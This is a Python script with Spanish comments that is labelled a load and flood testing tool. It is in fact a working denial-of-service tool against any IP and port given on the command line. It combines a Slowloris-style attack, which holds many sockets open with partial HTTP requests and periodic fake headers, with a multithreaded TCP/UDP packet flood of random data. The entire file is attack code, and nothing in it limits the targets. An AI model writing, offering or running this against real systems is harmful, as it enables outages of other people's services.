import logging
import argparse
import threading
import socket
import random
import time

# Configuración de registro
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Headers HTTP
regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

def init_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((ip, int(port)))
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('UTF-8'))
        for header in regular_headers:
            s.send('{}\r\n'.format(header).encode('UTF-8'))
        logging.info("Socket inicializado con éxito")
    except socket.error as e:
        logging.error(f"Error al establecer socket: {e}")
        s.close()
        return None
    return s

def send_keep_alive(sockets, timer, rate_limit):
    request_interval = 1 / rate_limit if rate_limit > 0 else 0
    while True:
        logging.info(f"Enviando Keep-Alive Headers a {len(sockets)} sockets")
        for s in sockets:
            try:
                time.sleep(request_interval)
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
            except socket.error as e:
                logging.error(f"Error en socket: {e}")
                sockets.remove(s)
                s.close()
        time.sleep(timer)

def flood_tcp_udp(ip, port, duration, packet_size, protocol):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == 'TCP' else socket.SOCK_DGRAM) as s:
                random_data = random._urandom(packet_size)
                s.sendto(random_data, (ip, port))
        except socket.error as e:
            logging.error(f"Error en inundación {protocol}: {e}")

def main(args):
    if args.socket_count <= 0 or args.timer < 0 or args.rate_limit < 0:
        logging.error("Argumentos inválidos")
        return

    sockets = []
    for _ in range(args.socket_count):
        s = init_socket(args.ip, args.port)
        if s:
            sockets.append(s)

    threading.Thread(target=send_keep_alive, args=(sockets, args.timer, args.rate_limit)).start()

    # Iniciar hilos para TCP/UDP Flood
    for _ in range(args.thread_count):
        threading.Thread(target=flood_tcp_udp, args=(args.ip, args.port, args.duration, args.packet_size, args.protocol)).start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script de Pruebas de Carga y Inundación TCP/UDP")
    parser.add_argument("ip", type=str, help="Dirección IP del servidor")
    parser.add_argument("port", type=int, help="Puerto del servidor")
    parser.add_argument("socket_count", type=int, help="Cantidad de sockets a crear para HTTP Flood")
    parser.add_argument("timer", type=int, help="Intervalo de tiempo entre envíos de Keep-Alive")
    parser.add_argument("--rate_limit", type=float, default=0, help="Limitación de tasa de solicitudes por segundo")
    parser.add_argument("--thread_count", type=int, default=10, help="Número de hilos para TCP/UDP Flood")
    parser.add_argument("--duration", type=int, default=60, help="Duración del TCP/UDP Flood en segundos")
    parser.add_argument("--packet_size", type=int, default=1024, help="Tamaño de los paquetes TCP/UDP en bytes")
    parser.add_argument("--protocol", type=str, default="TCP", choices=["TCP", "UDP"], help="Protocolo para la inundación (TCP o UDP)")

    args = parser.parse_args()
    main(args)
